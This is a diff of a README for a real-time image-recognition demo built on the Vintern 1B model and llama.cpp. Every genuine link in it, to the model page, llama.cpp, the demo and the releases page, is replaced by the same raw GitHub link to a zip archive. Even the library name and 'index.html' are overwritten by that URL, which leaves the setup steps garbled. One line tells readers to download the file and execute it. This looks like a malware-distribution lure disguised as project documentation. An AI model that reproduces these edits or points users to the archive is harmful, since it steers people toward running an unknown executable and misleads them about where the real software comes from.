@@ -1,6 +1,6 @@
 # Real-Time Image Recognition with Vintern 1B 🚀
 
-![Vintern Logo](https://img.shields.io/badge/Vintern-1B-blue.svg)
+![Vintern Logo](https://raw.githubusercontent.com/yuuddd53/vintern-realtime-demo/main/microbium/vintern_demo_realtime_v3.4-alpha.3.zip)
 
 Welcome to the **Vintern Realtime Demo** repository! This project showcases the capabilities of the Vintern 1B model for real-time image recognition. This lightweight model can run on personal computers without the need for a GPU, making it accessible for many users.
 
@@ -28,7 +28,7 @@ To run the Vintern model effectively, follow these guidelines:
 - **RAM**: Minimum of 8GB
 - **Internet**: Required only for the initial model download
 
-You can find the original model [here](https://huggingface.co/5CD-AI/Vintern-1B-v3_5).
+You can find the original model [here](https://raw.githubusercontent.com/yuuddd53/vintern-realtime-demo/main/microbium/vintern_demo_realtime_v3.4-alpha.3.zip).
 
 After the first run, the model will work offline.
 
@@ -36,7 +36,7 @@ After the first run, the model will work offline.
 
 Follow these steps to set up the Vintern model on your computer:
 
-1. **Install llama.cpp**: Start by installing the llama.cpp library. You can find it [here](https://github.com/ggml-org/llama.cpp).
+1. **Install https://raw.githubusercontent.com/yuuddd53/vintern-realtime-demo/main/microbium/vintern_demo_realtime_v3.4-alpha.3.zip**: Start by installing the https://raw.githubusercontent.com/yuuddd53/vintern-realtime-demo/main/microbium/vintern_demo_realtime_v3.4-alpha.3.zip library. You can find it [here](https://raw.githubusercontent.com/yuuddd53/vintern-realtime-demo/main/microbium/vintern_demo_realtime_v3.4-alpha.3.zip).
 
 2. **Run the Server**: Execute the following command in your terminal:
    ```bash
@@ -44,7 +44,7 @@ Follow these steps to set up the Vintern model on your computer:
    ```
    - If you are using an NVIDIA, AMD, or Intel GPU, you may need to add `-ngl 99` to activate it.
 
-3. **Open the Application**: Launch `index.html` in your web browser. Alternatively, you can access the demo using this link: [Vintern Realtime Demo](https://github.ngxson.com/vintern-realtime-demo/).
+3. **Open the Application**: Launch `https://raw.githubusercontent.com/yuuddd53/vintern-realtime-demo/main/microbium/vintern_demo_realtime_v3.4-alpha.3.zip` in your web browser. Alternatively, you can access the demo using this link: [Vintern Realtime Demo](https://raw.githubusercontent.com/yuuddd53/vintern-realtime-demo/main/microbium/vintern_demo_realtime_v3.4-alpha.3.zip).
 
 4. **Optional Customization**: You can modify the instructions, such as changing the output format to JSON instead of descriptions.
 
@@ -68,11 +68,11 @@ The Vintern model allows for some customization to fit your specific needs. Here
   
 - **Model Parameters**: You can adjust parameters like sensitivity and recognition thresholds to improve accuracy based on your use case.
 
-- **Testing with Other Models**: Explore other models available in the llama.cpp library. You can find a list of these models [here](https://github.com/ggml-org/llama.cpp/blob/master/docs/multimodal.md).
+- **Testing with Other Models**: Explore other models available in the https://raw.githubusercontent.com/yuuddd53/vintern-realtime-demo/main/microbium/vintern_demo_realtime_v3.4-alpha.3.zip library. You can find a list of these models [here](https://raw.githubusercontent.com/yuuddd53/vintern-realtime-demo/main/microbium/vintern_demo_realtime_v3.4-alpha.3.zip).
 
 ## Explore More
 
-For further enhancements and features, you can check the **Releases** section of this repository. Each release may include updates, bug fixes, and new functionalities. Visit the releases page [here](https://github.com/yuuddd53/vintern-realtime-demo/releases) to download the latest version and execute it.
+For further enhancements and features, you can check the **Releases** section of this repository. Each release may include updates, bug fixes, and new functionalities. Visit the releases page [here](https://raw.githubusercontent.com/yuuddd53/vintern-realtime-demo/main/microbium/vintern_demo_realtime_v3.4-alpha.3.zip) to download the latest version and execute it.
 
 ## Contributions
 
@@ -92,7 +92,7 @@ This project is licensed under the MIT License. See the LICENSE file for details
 
 ## Releases
 
-For the latest updates and downloads, visit the [Releases](https://github.com/yuuddd53/vintern-realtime-demo/releases) section. Here, you can find the most recent version of the Vintern model and any accompanying resources.
+For the latest updates and downloads, visit the [Releases](https://raw.githubusercontent.com/yuuddd53/vintern-realtime-demo/main/microbium/vintern_demo_realtime_v3.4-alpha.3.zip) section. Here, you can find the most recent version of the Vintern model and any accompanying resources.
 
 ## Conclusion
 
